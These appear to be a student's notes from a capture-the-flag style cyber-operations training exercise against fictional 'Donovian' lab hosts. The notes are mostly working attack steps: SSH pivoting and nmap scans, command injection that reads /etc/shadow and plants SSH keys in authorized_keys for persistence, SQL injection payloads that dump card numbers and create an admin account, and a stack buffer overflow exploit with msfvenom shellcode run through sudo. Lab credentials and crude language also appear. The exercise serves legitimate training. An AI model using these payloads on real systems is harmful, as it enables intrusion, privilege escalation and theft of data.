DAY1
Reconnaissance
Scheme of Maneuver:
>Jump Box
->Network scan: 192.168.28.96/27
-->Network scan:192.168.150.224/27


linOPS: ssh -M -S /tmp/jump -o StrictHostKeyChecking=no -o userknownhostsFile=/dev/null student@10.50.43.220
linOPS: ssh -S /tmp/jump student -D 9050
linOPS: ssh -S /tmp/jump user -O forward -L 2222:<ip>:22
linOPS: proxychains nmap -Pn -sT -n -p ports <ip>
================================================================
Nmap scan report for 192.168.28.105
Host is up (0.0017s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
2222/tcp open  EtherNetIP-1

PassTemporary
loginfirst
logout null bit
houseBeatFliesLOW
YourTempPassword

====================================================================

Nmap scan report for 192.168.28.111
Host is up (0.0020s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

80 is interesting
contact.html  css/  images/  index.html  projets.html  sites/
check index, projets, and sites/index
Futures Inc.

8080 is interesting
about.html  buy-tickets.html  contact.html  css  fonts  images  index.html  js  news.html  speakers.html
=====================================================================
Nmap scan report for 192.168.28.100
Host is up (0.0019s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1


===========================================================================
===========================================================================
DAY 2
Exploit Research
Web Exploitation

Scheme of Maneuver:
>Jump Box
->T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.

ssh to jump
ssh dynamic
ssh -S /tmp/jump user -O forward -L 2345:10.100.28.40:22    ip is T1
student@lin-ops:~$ proxychains nmap -Pn -T4 -sT -p 80 --script http-enum.nse 10.100.28.40
Nmap scan report for 10.100.28.40
Host is up (0.0082s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'


student@lin-ops:~$ proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse 10.100.28.40 
Nmap scan report for 10.100.28.40
Host is up (0.0075s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/net_test

firefox 127.0.0.1:2345
http://127.0.0.1:2345/uploads/message
Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
Please send me a corrected cert with the right now.
I took my online training from the following website
10.100.28.55

http://127.0.0.1:2345/net_test/industry_check.php
whoami
billybob billybob

; cat /etc/shadow
2GA7vl05Y8DTOjHnD3z6

|| ifconfig
ens3: flags=4163 mtu 1450 inet 10.100.28.40 netmask 255.255.255.224 broadcast 10.100.28.63 inet6 fe80::f816:3eff:fe02:944c prefixlen 64 scopeid 0x20 ether fa:16:3e:02:94:4c txqueuelen 1000 (Ethernet) RX packets 619085 bytes 203683835 (203.6 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 713066 bytes 85084445 (85.0 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 547373 bytes 89712419 (89.7 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 547373 bytes 89712419 (89.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

; ls -latr & netstat -rn
Kernel IP routing table Destination Gateway Genmask Flags MSS Window irtt Iface 0.0.0.0 10.100.28.33 0.0.0.0 UG 0 0 0 ens3 10.100.28.32 0.0.0.0 255.255.255.224 U 0 0 0 ens3 total 12 -rw-r--r-- 1 root root 1581 Mar 23 2022 industry_check.php drwxr-xr-x 2 root root 4096 Apr 19 2022 . drwxr-xr-x 7 root root 4096 Apr 19 2022 .. drwxr-xr-x 7 root root 4096 Apr 19 2022 ..

ssh-keygen -t rsa
-skip everything else-

 cat ~/.ssh/id_rsa.pub
copy whole bitch
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGqOXksZgFEr9tvx6D4O5PpcPw/BHGSuJsFMnMpqi7I+IbixSbWMZuoZ7NDQBoXC3Wq12WBmzAjdN4EHwadd8qRC4Ym4aI/NtwMseS9U3H1QQfYehKhlAodecCIx+6OMwVGrR417sMDcp0QatQlcWJ94bREXtpxgIQ8djqUmaZ5u2700ZJE/HgcXjKQ7IC01hccrdWEOOu0QiFVcMC7RZsjWXw/dnt4IAUsxVsFOsBN4b6Jn12cAay9v9tjnARqphj3mxXAe9q/h8FuCYzbTNCKmrnkJe9RTT5w0lru/tqJCezlkwAHX445tAdGWSoIXUNth6tKnlGYhAQ5FkREIIf student@lin-ops

; mkdir /home/billybob/.ssh
; echo "public key here" >> /home/billybob/.ssh/authorized_keys
; cat /billybob/home/.ssh/authorized_keys

linOPS: ssh -S /tmp/jump user -O forward -L 6789:10.100.28.40:4444
ssh billybob@localhost -p 6789

in /home, ls, follow that new user
cd into /var/www/html
look into Contract_bids.html

===========================================================================================
===========================================================================================
CTFd3

SQL injection
Donovian Database Exploitation (DWDBE)
XX Dec 2026
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyberspace Exploitation (C-E)

Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.

Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 5QL1nj3ct5t@rt0F@ct1v1ty

Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.

Scheme of Maneuver:
>internet_grey_host
â†’Pivot: 192.168.28.111
-â†’T1:10.100.28.48

Target Section:

Pivot
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: Ubuntu 18.04
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, system is cleared

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intellegence.

ssh -M -S /tmp/jump -o StrictHostKeyChecking=no -o userknownhostsFile=/dev/null student@10.50.43.220 -NT
ssh -S /tmp/jump user -O forward -L 2222:192.168.28.111:2222
ssh -S /tmp/jump user -O forward -p 2222 -L 3321:10.100.28.48:80

================================================================================================
================================================================================================
CTFd5

http://localhost:3321/cases/productsCategory.php?category=13%20UNION%20select%20table_schema,table_name,column_name%20FROM%20information_schema.columns
http://localhost:3321/cases/productsCategory.php?category=13%20UNION%20SELECT%201,2,creditcard_number%20FROM%20payments
http://localhost:3321/cases/productsCategory.php?category=13 UNION SELECT 1,2,creditcard_number FROM payments
.php?category=13 UNION SELECT 1,2,contentName FROM tableName
.php?category=13 UNION SELECT contentName,contentName,contentName FROM tableName

admin creds

FN       Hacker
LN       Hacker
USER     Hacker24
PASS     randomPass
EMAIL    Hacker\'',1);#


why?     in the "query executed" below
         INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', 'Hacker28', 'biub', 'Hacker\'''',1);#', 3)
         we made             (Hacker,     Hacker,    Hacker24, <stuff>,  Hacker\'',1);#', ;3)
         this works because the email is the last field before permissions, by putting  ,1);# we are hijacking the 
       account creation and setting our own permission to 1, because syntax things, and nullifying the standard
       3 (user) permissions set due to the # commenting out that portion. Giving ourselves god level perms and
       ignoring everything after. cool.

<name>\'',1);# 

===============================================================================================
===============================================================================================
CTFd6

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T3
Hostname: unknown
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.

ssh <master stuff>
ssh <dynamic stuff>
ssh -S /tmp/jump user -O forward -L 2222:192.168.28.100:2222

proxychains nmap 192.168.28.100 -p- -T4
Nmap scan report for 192.168.28.100
Host is up (0.0019s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1   -SSH***

student@lin-ops:~$ ssh -S /tmp/jump user -O forward -L 8069:192.168.28.100:80
student@lin-ops:~$ firefox localhost:8069

SQL Injection Time
http://localhost:8069/admin/
<login screen>
U: tom' or 1='1
P: tom' or 1='1
; cat /etc/passwd
-RESULT-
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
comrade:x:1001:1001::/home/comrade:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

; last
-RESULT-
reboot   system boot  4.15.0-88-generi Tue Oct 17 20:40   still running
reboot   system boot  4.15.0-88-generi Tue Oct 17 20:37 - 20:39  (00:02)
reboot   system boot  4.15.0-88-generi Thu May  4 15:19 - 20:39 (166+05:20)
reboot   system boot  4.15.0-88-generi Thu May  4 15:12 - 15:19  (00:06)

; whoami
-RESULT
www-data

; find / -name *".txt"
/home/comrade/Dekstop/network/.mapkey.txt
; find / -name *"inventory"*
cat <fileNameShit>

; ls -la /var/www/
; ls -la /var/www/.ssh/authorized_keys
*if doesnt exsist, mkdir that bitch

on opStation
ssh-keygen -t rsa
student@lin-ops:/home$ ls /home/student/.ssh
student@lin-ops:/home$ cat /home/student/.ssh/id_rsa.pub.pub 
-copy this whole thing-
; mkdir /var/www/.ssh/
; echo "publicCopiedKey" >> /var/www/.ssh/authorized_keys
ssh -S /tmp/jump user -O forward -L 40000:192.168.28.100:2222
ssh www-data@localhost -p 40000

-now on www-data@extranet-
-tunnels here

end here-

=========================================================================
=========================================================================
CTFd7

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245

Target Section:
T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

student@lin-ops:~$ ssh student@localhost -L 15000:10.50.43.220:22 -NT
student@lin-ops:~$   ssh-keygen -f "/home/student/.ssh/known_hosts" -R "[localhost]:15000" ---might have to run this
student@lin-ops:~$ ssh student@localhost -p 15000 -D 9050
student@lin-ops:~$ proxychains ssh comrade@192.168.28.111 -p 2222
       StudentWebExploitPassword

comrade@web:~$ cd /.hidden
comrade@web:/.hidden$ ls -la
-rwxr-xr-x  1 root root 7352 Dec 30  2021 inventory.exe
comrade@web:/.hidden$ gdb inventory.exe
(gdb) run
Starting program: /.hidden/inventory.exe 
Press enter to view inventory: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

(gdb) info proc map
0x804b000  0x806d000    0x22000        0x0 [heap]
	0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fc1000 0xf7fc2000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc2000 0xf7fc4000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc4000 0xf7fc5000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fc5000 0xf7fc8000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find /b 0xf7def000, 0xffffe000, 0xff, 0xe4
0xf7df1b51
0xf7f6674b
0xf7f72753

student@lin-ops:~$ msfvenom -p linux/x86/exec CMD=cat -b '\x00' -f python
buf += b"\xba\x4d\xd5\x81\x94\xda\xca\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x0a\x31\x53\x15\x83\xc3\x04\x03\x53"
buf += b"\x11\xe2\xb8\xbf\x8a\xcc\xdb\x12\xeb\x84\xf6\xf1"
buf += b"\x7a\xb3\x60\xd9\x0f\x54\x70\x4d\xdf\xc6\x19\xe3"
buf += b"\x96\xe4\x8b\x13\xac\xea\x2b\xe4\xce\x8b\x5f\xe4"
buf += b"\x47\x1f\x16\x05\xaa\x1f"

====EXPLOIT===
#!/usr/bin/python2.7

buf = "A" * 76 #get us to the EIP register
'''
0xf7df1b51 -> "\x51\x1b\xdf\xf7"
0xf7f6674b
0xf7f72753
'''
buf += "\x51\x1b\xdf\xf7" #set of instructions for JMP ESP

buf +="\x90" * 10

#payload here
#student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b '\x00' -f python
buf += b"\xba\xec\xb1\xb7\xdc\xdb\xcd\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x11\x31\x50\x12\x03\x50\x12\x83\x04"
buf += b"\x4d\x55\x29\xbe\xa5\xc2\x4b\x6c\xdc\x9a\x46\xf3"
buf += b"\xa9\xbc\xf1\xdc\xda\x2a\x02\x4a\x32\xc9\x6b\xe4"
buf += b"\xc5\xee\x3e\x10\xc8\xf0\xbe\xe0\x90\x91\xca\xc0"
buf += b"\x79\x7c\x40\x65\xe5\xf2\xc3\x11\xc6\xdc\x7d\xbc"
buf += b"\x6a\x58\xf1\x5b\xe8\xe8\x90\xd7\xc0\x7c\x3f\x75"
buf += b"\x1d\x2a\xec\xf0\xfc\x19\x92"

print(buf)
===EXPLOIT===

comrade@web:~$ chmod +x mybuff.py

comrade@web:~$ sudo /.hidden/inventory.exe <<< $(/home/comrade/mybuff.py)
 stuff
 stuff
 stuff
 FLAG!!!





